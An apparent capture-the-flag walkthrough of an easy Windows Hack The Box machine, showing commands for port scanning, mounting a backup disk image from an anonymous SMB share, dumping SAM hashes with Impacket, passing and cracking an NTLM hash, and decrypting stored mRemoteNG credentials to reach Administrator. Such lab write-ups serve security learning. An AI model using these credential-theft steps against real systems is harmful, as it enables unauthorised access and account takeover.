---
date: 2025-12-30
categories: [Windows, Easy]
---

<img width="300" height="300" alt="Union" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/68c7186b753828391c67c4f737f5400f.png" />

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [L4mpje](https://app.hackthebox.com/users/29267)    | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Windows   |

---






##  Enumeration

- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.10.134 -oG scan
	/opt/extractports scan
	nmap -p22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 -Pn -sCV 10.10.10.134 -oN ports
	```

	<img width="1422" height="761" alt="image" src="https://github.com/user-attachments/assets/1bcfeede-9124-4fce-b500-db0d8015667a" />

## SMB

- SMB was exposed, so I enumerated available shares using anonymous access

	```python
	smbmap -H 10.10.10.134 -u 'guest'
	```

- I discovered a share named **Backups** with read and write permissions.
- Due to a note warning that downloading all files could impact VPN stability, I decided to mount the share locally:

	```python
	mount -t cifs //10.10.10.134/backups /mnt -o user=,password=
	# alternatively 
	mount //10.10.10.134/Backups smbShares/   
	```

- Inside the share, I identified two `.vhd` disk image files. The first one only contained boot files, so I focused on mounting the second image.

## Offline Credential Extraction

- To mount the VHD file, I used `qemu-nbd`:

	```python
	modprobe nbd
	ls /dev
	
	qemu-nbd --read-only -c /dev/nbd0 \
	'smbShares/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd'
	
	mkdir /mnt/HDD
	mount /dev/nbd0p1 /mnt/HDD
	```

-  The mounted filesystem belonged to a Windows installation. I copied the registry hive files required to extract credentials: 

	```python
	cd /mnt/HDD/Windows/System32/config
	cp SAM SYSTEM SECURITY /tmp
	```

- Using Impacket, I dumped the local account hashes

	```python
	impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
	```

- This yielded the NTLM hash for the user **L4mpje**. I verified that the hash was valid:

	```python
	netexec smb 10.10.10.134 -u L4mpje -H "aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9"
	```

- I then cracked the hash using `hashcat`:

	```python
	hashcat -m 1000 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt
	```

- With the recovered credentials and knowing that SSH was available, I authenticated to the system

	```python
	ssh L4mpje@10.10.10.134
	```

- This allowed me to retrieve the user flag

## Privilege Escalation

- While enumerating installed applications, I discovered **mRemoteNG** on the system.

- I located its configuration directory:

	```python
	C:\Users\L4mpje\appdata\Roaming\mRemoteNG encuentro el fichero confCons.xml
	```

- Within this directory, I found the file `confCons.xml`. Checking the changelog confirmed the version **1.76.11**, which stores encrypted credentials using a reversible algorithm

- I used a [public decryption tool](https://github.com/gquere/mRemoteNG_password_decrypt) to recover stored credentials

	```python
	python3 mremoteng_decrypt.py confCons.xml
	```

- This revealed the **Administrator** password in clear text. Using these credentials, I connected via SSH

	```python
	ssh Administrator@10.10.10.134
	```

- As Administrator, I was able to retrieve the root flag
